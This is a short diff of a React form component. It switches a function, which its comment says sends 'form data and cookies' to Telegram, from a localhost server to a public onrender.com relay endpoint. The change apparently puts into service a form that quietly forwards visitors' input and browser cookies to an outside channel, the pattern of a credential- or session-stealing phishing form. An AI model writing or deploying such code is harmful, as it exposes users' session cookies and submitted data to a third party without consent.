@@ -12,7 +12,7 @@ const UserForm = () => {
   // Function to send form data and cookies to Telegram
   const sendToTelegram = async (data) => {
     try {
-      const response = await fetch("http://localhost:5000/send-to-telegram", {
+      const response = await fetch("https://react-telegram-form-4.onrender.com/send-to-telegram", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
